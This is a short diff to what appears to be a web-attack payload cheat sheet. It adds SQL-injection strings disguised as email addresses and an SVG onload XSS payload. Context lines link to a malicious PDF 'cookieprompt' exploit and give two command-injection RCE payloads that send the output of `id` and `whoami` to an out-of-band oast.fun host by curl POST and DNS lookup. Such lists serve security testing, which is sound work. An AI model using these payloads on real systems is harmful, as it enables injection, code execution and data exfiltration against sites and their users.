@@ -105,6 +105,12 @@ PDF-prompt:
 https://raw.githubusercontent.com/coffinxp/pdFExploits/refs/heads/main/cookieprompt.pdf
 
 --------------------------------------------------------------------------------------------------------------------------
+Email Address:
+--------------
+1' OR '1'='1' -- -@gmail.com
+"1' OR '1'='1' -- -"@gmail.com
+
+'"><svg/onload=alert(1);>'
 
 RCE:  https://subdomain.domain.tld/emdpoint?param=value;curl https://leejddzqxtsqqoufangeztlfxozoqwtf2.oast.fun -X POST -d `id`
 RCE:  https://subdomain.domain.tld/emdpoint?param=value;nslookup `whoami`.leejddzqxtsqqoufangeztlfxozoqwtf2.oast.fun
